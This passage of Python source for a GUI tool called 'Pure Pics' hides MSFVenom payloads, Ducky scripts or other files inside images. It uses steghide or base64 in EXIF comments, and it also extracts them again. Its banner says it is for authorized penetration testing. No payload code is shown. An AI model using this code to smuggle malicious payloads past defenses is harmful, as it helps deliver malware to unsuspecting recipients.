            self.update_image_preview(output_path)
            self.append_status(f"🎲 Random image generated: {output_path}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate random image: {str(e)}")
    
    def create_solid_image(self):
        """Create solid color image"""
        try:
            # Create solid black image (good for steganography)
            width, height = 1024, 768
            img = Image.new('RGB', (width, height), color='black')
            
            # Save image
            output_path = os.path.join(self.output_dir.get(), "solid_cover.jpg")
            img.save(output_path, "JPEG", quality=95)
            
            self.cover_image_path.set(output_path)
            self.update_image_preview(output_path)
            self.append_status(f"🎨 Solid color image created: {output_path}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create solid image: {str(e)}")
    
    def create_qr_image(self):
        """Create QR code image"""
        try:
            # Get text for QR code
            qr_text = tk.simpledialog.askstring("QR Code", "Enter text for QR code:", 
                                               initialvalue="https://example.com")
            
            if not qr_text:
                return
            
            # Generate QR code
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(qr_text)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color='black', back_color='white')
            
            # Save image
            output_path = os.path.join(self.output_dir.get(), "qr_cover.png")
            img.save(output_path)
            
            self.cover_image_path.set(output_path)
            self.update_image_preview(output_path)
            self.append_status(f"📱 QR code image created: {output_path}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create QR image: {str(e)}")
    
    # Embedding methods
    def browse_custom_payload(self):
        """Browse for custom payload file"""
        filename = filedialog.askopenfilename(
            filetypes=[("All files", "*.*")],
            title="Select Custom Payload File"
        )
        
        if filename:
            self.custom_payload_path.set(filename)
            size = os.path.getsize(filename)
            self.append_status(f"📁 Custom payload selected: {os.path.basename(filename)} ({size} bytes)")
    
    def browse_output_dir(self):
        """Browse for output directory"""
        directory = filedialog.askdirectory(title="Select Output Directory")
        if directory:
            self.output_dir.set(directory)
    
    def toggle_password(self):
        """Toggle password visibility"""
        # This is a placeholder - would need custom entry widget for full implementation
        pass
    
    def embed_payload(self):
        """Embed payload into image"""
        try:
            self.append_status("🔒 Starting payload embedding...")
            
            # Validate inputs
            if not self.cover_image_path.get():
                messagebox.showerror("Error", "Please select a cover image!")
                return
            
            # Get payload file
            payload_path = None
            if self.payload_type.get() == "msfvenom":
                if hasattr(self, 'current_payload_path') and os.path.exists(self.current_payload_path):
                    payload_path = self.current_payload_path
                else:
                    messagebox.showerror("Error", "Please generate an MSFVenom payload first!")
                    return
            elif self.payload_type.get() == "ducky":
                if hasattr(self, 'current_ducky_path') and os.path.exists(self.current_ducky_path):
                    payload_path = self.current_ducky_path
                else:
                    messagebox.showerror("Error", "Please prepare a Ducky script first!")
                    return
            elif self.payload_type.get() == "custom":
                if self.custom_payload_path.get() and os.path.exists(self.custom_payload_path.get()):
                    payload_path = self.custom_payload_path.get()
                else:
                    messagebox.showerror("Error", "Please select a custom payload file!")
                    return
            
            # Build output path
            output_path = os.path.join(self.output_dir.get(), self.output_filename.get())
            
            # Perform embedding based on method
            if self.embedding_method.get() == "steghide":
                self.embed_with_steghide(payload_path, output_path)
            elif self.embedding_method.get() == "metadata":
                self.embed_with_metadata(payload_path, output_path)
            else:
                messagebox.showinfo("Info", "LSB method not yet implemented in this demo version.")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to embed payload: {str(e)}")
    
    def embed_with_steghide(self, payload_path, output_path):
        """Embed using steghide"""
        try:
            command = [
                "steghide", "embed",
                "-cf", self.cover_image_path.get(),
                "-ef", payload_path,
                "-p", self.stego_password.get(),
                "-sf", output_path
            ]
            
            self.append_status(f"🔐 Using steghide with password protection...")
            self.log_operation("STEGHIDE EMBEDDING", " ".join(command))
            
            # Run command
            threading.Thread(target=self.run_embedding_command, args=(command, output_path), daemon=True).start()
            
        except Exception as e:
            self.append_status(f"❌ Steghide embedding error: {str(e)}")
    
    def embed_with_metadata(self, payload_path, output_path):
        """Embed using metadata"""
        try:
            # Read payload and encode as base64
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            encoded_payload = base64.b64encode(payload_data).decode('utf-8')
            
            # Copy image and add metadata
            shutil.copy2(self.cover_image_path.get(), output_path)
            
            # Use exiftool to embed in comment
            command = [
                "exiftool",
                "-Comment=" + encoded_payload,
                "-overwrite_original",
                output_path
            ]
            
            self.append_status(f"📋 Using metadata embedding...")
            self.log_operation("METADATA EMBEDDING", " ".join(command))
            
            # Run command
            threading.Thread(target=self.run_embedding_command, args=(command, output_path), daemon=True).start()
            
        except Exception as e:
            self.append_status(f"❌ Metadata embedding error: {str(e)}")
    
    def run_embedding_command(self, command, output_path):
        """Run embedding command in separate thread"""
        try:
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1
            )
            
            for line in process.stdout:
                self.root.after(0, self.append_status, line.strip())
            
            process.wait()
            
            if process.returncode == 0:
                size = os.path.getsize(output_path)
                self.root.after(0, self.append_status, f"✅ Payload embedded successfully!")
                self.root.after(0, self.append_status, f"📁 Output: {output_path} ({size} bytes)")
                self.root.after(0, messagebox.showinfo, "🖼️ Pure Pics Success", 
                               f"Payload embedded successfully!\n\n📁 File: {os.path.basename(output_path)}\n💾 Size: {size} bytes\n🔐 Password: {self.stego_password.get()}")
            else:
                self.root.after(0, self.append_status, f"❌ Embedding failed!")
                
        except Exception as e:
            self.root.after(0, self.append_status, f"❌ Error: {str(e)}")
    
    # Extraction methods
    def browse_extract_image(self):
        """Browse for image to extract from"""
        filename = filedialog.askopenfilename(
            filetypes=[("Image files", "*.jpg *.jpeg *.png *.bmp *.gif"), ("All files", "*.*")],
            title="Select Steganographic Image"
        )
        
        if filename:
            self.extract_image_path.set(filename)
            self.append_status(f"🔍 Selected image for extraction: {os.path.basename(filename)}")
    
    def extract_payload(self):
        """Extract payload from image"""
        try:
            if not self.extract_image_path.get():
                messagebox.showerror("Error", "Please select a steganographic image!")
                return
            
            self.extraction_results.delete('1.0', tk.END)
            self.extraction_results.insert(tk.END, "🔓 Starting payload extraction...\n\n")
            
            if self.extract_method.get() == "steghide":
                self.extract_with_steghide()
            elif self.extract_method.get() == "metadata":
                self.extract_with_metadata()
            else:
                messagebox.showinfo("Info", "LSB extraction not yet implemented in this demo version.")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to extract payload: {str(e)}")
    
    def extract_with_steghide(self):
        """Extract using steghide"""
        try:
            output_file = os.path.join(self.output_dir.get(), "extracted_payload.bin")
            
            command = [
                "steghide", "extract",
                "-sf", self.extract_image_path.get(),
                "-p", self.extract_password.get(),
                "-xf", output_file
            ]
            
            self.log_operation("STEGHIDE EXTRACTION", " ".join(command))
            
            # Run command
            threading.Thread(target=self.run_extraction_command, args=(command, output_file), daemon=True).start()
            
        except Exception as e:
            self.append_extraction_result(f"❌ Steghide extraction error: {str(e)}")
    
    def extract_with_metadata(self):
        """Extract using metadata"""
        try:
            # Use exiftool to extract comment
            command = ["exiftool", "-Comment", self.extract_image_path.get()]
            
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            output, _ = process.communicate()
            
            if "Comment" in output:
                # Extract base64 data
                comment_line = [line for line in output.split('\n') if 'Comment' in line][0]
                encoded_data = comment_line.split(':', 1)[1].strip()
                
                # Decode and save
                try:
                    payload_data = base64.b64decode(encoded_data)
                    output_file = os.path.join(self.output_dir.get(), "extracted_payload.bin")
                    
                    with open(output_file, 'wb') as f:
                        f.write(payload_data)
                    
                    size = len(payload_data)
                    self.append_extraction_result(f"✅ Payload extracted from metadata!")
                    self.append_extraction_result(f"📁 Output: {output_file} ({size} bytes)")
                    
                    messagebox.showinfo("🔓 Pure Pics Success", 
                                       f"Payload extracted successfully!\n\n📁 File: extracted_payload.bin\n💾 Size: {size} bytes")
                    
                except Exception as decode_error:
                    self.append_extraction_result(f"❌ Failed to decode payload: {str(decode_error)}")
            else:
                self.append_extraction_result("❌ No embedded data found in metadata!")
            
        except Exception as e:
            self.append_extraction_result(f"❌ Metadata extraction error: {str(e)}")
    
    def run_extraction_command(self, command, output_file):
        """Run extraction command in separate thread"""
        try:
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1
            )
            
            for line in process.stdout:
                self.root.after(0, self.append_extraction_result, line.strip())
            
            process.wait()
            
            if process.returncode == 0 and os.path.exists(output_file):
                size = os.path.getsize(output_file)
                self.root.after(0, self.append_extraction_result, f"✅ Payload extracted successfully!")
                self.root.after(0, self.append_extraction_result, f"📁 Output: {output_file} ({size} bytes)")
                self.root.after(0, messagebox.showinfo, "🔓 Pure Pics Success", 
                               f"Payload extracted successfully!\n\n📁 File: {os.path.basename(output_file)}\n💾 Size: {size} bytes")
            else:
                self.root.after(0, self.append_extraction_result, f"❌ Extraction failed!")
                
        except Exception as e:
            self.root.after(0, self.append_extraction_result, f"❌ Error: {str(e)}")
    
    def append_extraction_result(self, text):
        """Append text to extraction results"""
        self.extraction_results.insert(tk.END, text + "\n")
        self.extraction_results.see(tk.END)
        self.root.update_idletasks()
    
    # History methods
    def clear_history(self):
        """Clear operation history"""
        if messagebox.askyesno("Clear History", "Are you sure you want to clear the operation history?"):
            self.operation_history.clear()
            self.history_text.delete('1.0', tk.END)
    
    def export_history(self):
        """Export operation history to file"""
        if not self.operation_history:
            messagebox.showwarning("No History", "No operation history to export.")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            title="Export Operation History"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("Pure Pics - Operation History\n")
                    f.write("=" * 50 + "\n\n")
                    for entry in self.operation_history:
                        f.write(entry)
                messagebox.showinfo("Export Complete", f"History exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export Error", f"Failed to export history: {str(e)}")
    
    def generate_report(self):
        """Generate comprehensive report"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_file = os.path.join(self.output_dir.get(), f"pure_pics_report_{timestamp}.txt")
            
            with open(report_file, 'w') as f:
                f.write("🖼️ PURE PICS - COMPREHENSIVE OPERATION REPORT\n")
                f.write("=" * 60 + "\n\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Operations: {len(self.operation_history)}\n\n")
                
                f.write("OPERATION HISTORY:\n")
                f.write("-" * 30 + "\n")
                for entry in self.operation_history:
                    f.write(entry)
                
                f.write("\nREPORT END\n")
                f.write("=" * 60 + "\n")
            
            messagebox.showinfo("Report Generated", f"Comprehensive report saved to:\n{report_file}")
            
        except Exception as e:
            messagebox.showerror("Report Error", f"Failed to generate report: {str(e)}")

def print_banner():
    """Print Pure Pics CPR-themed banner"""
    # ANSI color codes for red styling
    RED = '\033[91m'
    BRIGHT_RED = '\033[31;1m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    
    banner = f"""
{BRIGHT_RED}    ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗ ██╗ ██████╗███████╗{RESET}
{BRIGHT_RED}    ██╔══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██║██╔════╝██╔════╝{RESET}
{BRIGHT_RED}    ██████╔╝██║   ██║██████╔╝█████╗      ██████╔╝██║██║     ███████╗{RESET}
{BRIGHT_RED}    ██╔═══╝ ██║   ██║██╔══██╗██╔══╝      ██╔═══╝ ██║██║     ╚════██║{RESET}
{BRIGHT_RED}    ██║     ╚██████╔╝██║  ██║███████╗    ██║     ██║╚██████╗███████║{RESET}
{GRAY}    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝ ╚═════╝╚══════╝{RESET}

{BOLD}{WHITE}    🖼️ {BRIGHT_RED}PURE PICS{WHITE} - CPR Edition{RESET}
{WHITE}    🎯 Advanced Steganographic Payload & Ducky Script Embedding{RESET}
{RED}    ⚠️  Educational and Authorized Penetration Testing Only{RESET}
{WHITE}    🛡️  Built for Cybersecurity Professionals{RESET}
{GRAY}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
    """
    print(banner)

def main():
    """Main function to run Pure Pics"""
    print_banner()
    
    # Check dependencies
    dependencies = ["steghide", "msfvenom"]
    missing = []
    
    for dep in dependencies:
        if not shutil.which(dep):
            missing.append(dep)
    
    if missing:
        print(f"{RED}❌ Missing dependencies: {', '.join(missing)}{RESET}")
        print(f"{WHITE}Please install missing tools before running Pure Pics{RESET}")
        return
    
    print(f"{BRIGHT_RED}✅ All dependencies found! Starting Pure Pics...{RESET}")
    
    root = tk.Tk()
    app = PurePicsGUI(root)
    
    # Center window on screen
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
    y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
    root.geometry(f"+{x}+{y}")
    
    root.mainloop()

if __name__ == "__main__":
    # Color codes for terminal output
    RED = '\033[91m'
    BRIGHT_RED = '\033[31;1m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    
    main()